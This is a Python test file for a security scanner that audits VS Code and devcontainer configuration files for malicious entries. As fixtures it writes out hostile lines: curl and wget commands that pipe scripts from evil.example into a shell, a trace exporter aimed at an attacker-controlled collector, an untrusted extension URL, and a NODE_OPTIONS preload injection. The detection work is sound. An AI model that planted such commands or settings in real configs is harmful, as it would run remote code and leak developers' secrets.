"""Tests for VS Code-style IDE config and APM integration scanning."""

from pathlib import Path

from click.testing import CliRunner

from skillseraph.cli import main
from skillseraph.local_audit import audit_local_ide_configs
from skillseraph.models import Platform
from skillseraph.scanner import scan_directory, scan_file


def test_vscode_workspace_platform_detected(tmp_path: Path):
    vscode = tmp_path / ".vscode"
    vscode.mkdir()
    (vscode / "settings.json").write_text('{"editor.formatOnSave": true}')

    result = scan_directory(tmp_path)

    assert Platform.VSCODE in result.platforms_detected
    assert result.files_scanned == 1


def test_nested_vscode_workspace_scanned_when_target_is_parent(tmp_path: Path):
    tasks = tmp_path / "project-a" / ".vscode" / "tasks.json"
    tasks.parent.mkdir(parents=True)
    tasks.write_text('{"version": "2.0.0", "tasks": []}')

    result = scan_directory(tmp_path, platforms=[Platform.VSCODE])

    assert result.files_scanned == 1


def test_vscode_task_remote_shell_pipe_detected(tmp_path: Path):
    tasks = tmp_path / ".vscode" / "tasks.json"
    tasks.parent.mkdir()
    tasks.write_text(
        """{
  "version": "2.0.0",
  "tasks": [{
    "label": "bootstrap",
    "type": "shell",
    "command": "curl https://evil.example/install.sh | bash"
  }]
}"""
    )

    findings = scan_file(tasks)

    assert any(f.check == "ide_task_remote_shell_pipe" for f in findings)


def test_launch_config_secret_env_and_apm_collector_detected(tmp_path: Path):
    launch = tmp_path / ".vscode" / "launch.json"
    launch.parent.mkdir()
    launch.write_text(
        """{
  "configurations": [{
    "name": "debug api",
    "env": {
      "AWS_SECRET_ACCESS_KEY": "not-a-real-secret",
      "OTEL_EXPORTER_OTLP_ENDPOINT": "https://collector.attacker.example/v1/traces"
    }
  }]
}"""
    )

    findings = scan_file(launch)

    assert any(f.check == "ide_secret_env_injection" for f in findings)
    assert any(f.check == "ide_apm_external_collector" for f in findings)


def test_devcontainer_lifecycle_remote_shell_pipe_detected(tmp_path: Path):
    devcontainer = tmp_path / ".devcontainer" / "devcontainer.json"
    devcontainer.parent.mkdir()
    devcontainer.write_text(
        """{
  "name": "api",
  "postCreateCommand": "wget https://evil.example/bootstrap.sh | sh"
}"""
    )

    findings = scan_file(devcontainer)

    assert any(f.check == "ide_task_remote_shell_pipe" for f in findings)


def test_multiline_extension_recommendation_url_detected(tmp_path: Path):
    extensions = tmp_path / ".vscode" / "extensions.json"
    extensions.parent.mkdir()
    extensions.write_text(
        """{
  "recommendations": [
    "https://evil.example/extension.vsix"
  ]
}"""
    )

    findings = scan_file(extensions)

    assert any(f.check == "ide_untrusted_extension_recommendation" for f in findings)


def test_local_audit_scans_user_level_vscode_config(tmp_path: Path):
    settings = tmp_path / "Library" / "Application Support" / "Code" / "User" / "settings.json"
    settings.parent.mkdir(parents=True)
    settings.write_text(
        """{
  "terminal.integrated.env.osx": {
    "NODE_OPTIONS": "--require /tmp/evil-preload.js"
  }
}"""
    )

    result = audit_local_ide_configs(home=tmp_path)

    assert result.files_scanned == 1
    assert Platform.VSCODE in result.platforms_detected
    assert any(f.check == "ide_runtime_preload" for f in result.findings)


def test_audit_local_cli_writes_json(tmp_path: Path):
    settings = tmp_path / "Library" / "Application Support" / "Code" / "User" / "settings.json"
    settings.parent.mkdir(parents=True)
    settings.write_text(
        """{
  "terminal.integrated.env.osx": {
    "NODE_OPTIONS": "--require /tmp/evil-preload.js"
  }
}"""
    )
    report = tmp_path / "ide-audit.json"

    result = CliRunner().invoke(main, ["audit-local", "--home", str(tmp_path), "--json-out", str(report)])

    assert result.exit_code == 1
    assert report.exists()
    assert "ide_runtime_preload" in report.read_text()


def test_audit_local_cli_defaults_to_home(tmp_path: Path):
    settings = tmp_path / "Library" / "Application Support" / "Code" / "User" / "settings.json"
    settings.parent.mkdir(parents=True)
    settings.write_text(
        """{
  "terminal.integrated.env.osx": {
    "NODE_OPTIONS": "--require /tmp/evil-preload.js"
  }
}"""
    )

    result = CliRunner().invoke(
        main,
        ["audit-local", "--fail-on", "none"],
        env={"HOME": str(tmp_path)},
    )

    assert result.exit_code == 0
    assert "Platforms: vscode" in result.output
    assert "Files scanned: 1" in result.output
